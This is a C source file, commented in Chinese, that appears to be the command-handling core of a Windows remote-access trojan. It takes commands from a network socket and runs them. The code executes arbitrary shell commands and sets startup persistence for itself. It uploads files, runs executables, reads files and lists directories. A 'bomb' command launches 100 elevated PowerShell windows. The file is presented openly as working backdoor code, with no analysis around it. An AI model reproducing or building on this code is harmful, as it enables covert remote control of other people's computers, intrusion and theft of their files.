#include"header.h"
#include <windows.h>
#include <winsock2.h>
#include <stdio.h>
#include <string.h>

// 解析命令的核心函数
ParsedCommand parsecommand(char* raw_command) {
    ParsedCommand cmd = { CMD_UNKNOWN };
    char* token = strtok(raw_command, " ");
    int i = 0;

    // 分割命令参数
    while (token != NULL && i < 10) {
        cmd.params[i++] = token;
        token = strtok(NULL, " ");
    }
    cmd.num_params = i;

    if (cmd.num_params < 1) {
        return cmd; // 无效命令
    }

    // 根据命令类型设置解析结果
    if (strcmp(cmd.params[0], "cmd") == 0) {
        cmd.type = CMD_EXECUTE;
    }
    else if (strcmp(cmd.params[0], "whoami") == 0) {
        cmd.type = CMD_GETHOSTNAME;
    }
    else if (strcmp(cmd.params[0], "getuptime") == 0) {
        cmd.type = CMD_GETUPTIME;
    }
    else if (strcmp(cmd.params[0], "setstartup") == 0) {
        cmd.type = CMD_SETSTARTUP;
    }
    else if (strcmp(cmd.params[0], "UPLOAD") == 0) {
        cmd.type = CMD_FILE_UPLOAD;
    }
    else if (strcmp(cmd.params[0], "KILL_PROCESS") == 0) {
        cmd.type = CMD_KILL_PROCESS;
    }
    else if (strcmp(cmd.params[0], "bomb!!!") == 0) {
        cmd.type = CMD_BOMB;
    }
    else if (strcmp(cmd.params[0], "ls") == 0) {
        cmd.type = CMD_LS;
    }
    else if (strcmp(cmd.params[0], "run") == 0) {
        cmd.type = CMD_RUN;
    }
    else if (strcmp(cmd.params[0], "cd") == 0) {
        cmd.type = CMD_CD;
    }
    else if (strcmp(cmd.params[0], "pwd") == 0) {
        cmd.type = CMD_PWD;
    }
    else if (strcmp(cmd.params[0], "cat") == 0) {
        cmd.type = CMD_CAT;
    }
    else if (strcmp(cmd.params[0], "upload") == 0) {
        cmd.type = CMD_FILE_UPLOAD;
    }


    return cmd;
}

// 根据解析结果执行命令的函数
char* execute_parsed_command(ParsedCommand cmd, SOCKET tcpsock) {
    char* output = NULL;

    switch (cmd.type) {
    case CMD_EXECUTE:
        if (cmd.num_params >= 2) {
            char command[DEFAULT_BUFLEN] = { 0 };
            for (int i = 1; i < cmd.num_params; i++) {
                strcat(command, cmd.params[i]);
                strcat(command, " ");
            }

            // 使用改进版执行命令
            output = ExecuteCommand(command);
            if (!output)
                output = _strdup("[!] command execution failed");
        }
        else {
            output = _strdup("no command passed");
        }
        break;

    case CMD_GETHOSTNAME: {
        char hostname[DEFAULT_BUFLEN];
        gethostname(hostname, DEFAULT_BUFLEN);
        output = _strdup(hostname);
        break;
    }

    case CMD_GETUPTIME: {
        DWORD64 total = GetTickCount64() / 1000;
        char uptime[DEFAULT_BUFLEN];
        sprintf(uptime, "[Uptime] %dd %dh %dm.",
            (int)(total / 86400),
            (int)((total % 86400) / 3600),
            (int)(((total % 86400) % 3600) / 60));
        output = _strdup(uptime);
        break;
    }

    case CMD_SETSTARTUP: {
        char current_path[MAX_PATH];
        GetModuleFileNameA(NULL, current_path, MAX_PATH);

        if (!strcmp(cmd.params[1], "true")) {
            set_startup(current_path, 1);
        }
        else if (!strcmp(cmd.params[1], "false")) {
            set_startup(current_path, 0);
        }
        output = _strdup("[+] Startup setting updated.");
        break;
    }

    case CMD_FILE_UPLOAD:
        if (!handle_file_upload(cmd)) {
            output = _strdup("[+] Handle file upload success.");
        }
        else {
            output = _strdup("[+] Handle file upload fail.");
        }
        break;

    case CMD_KILL_PROCESS:
        output = _strdup("[!] Kill process not implemented.");
        break;

    case CMD_BOMB:
        for (int i = 0; i < 100; ++i) {
            ShellExecuteA(NULL, "runas", "powershell.exe", "-Command dir -Recurse; Read-Host", NULL, SW_SHOWNORMAL);
        }
        output = _strdup("[+] Bombed processes.");
        break;

    case CMD_LS:
        if (cmd.num_params >= 2) {
            output = list_directory(cmd.params[1]);
        }
        else {
            output = list_directory(".");//默认路径
        }
        break;

    case CMD_RUN:
        if (cmd.num_params >= 2) {
            if (run_executable(cmd.params[1]) == 0) {
                output = _strdup("Execute succeeded");
            }
            else{
                output = _strdup("Execute failed");
            }

        }
        else {
            output = _strdup("Usage: run <executable>");
        }
        break;

    case CMD_CD:
        output = cd_command(cmd.params[1]);
        break;

    case CMD_PWD:
        output = pwd_command();
        break;

    case CMD_CAT:
        output = cat_file(cmd.params[1]);
        break;




    default:
        output = _strdup("unknown command");
        break;
    }



    return output;
}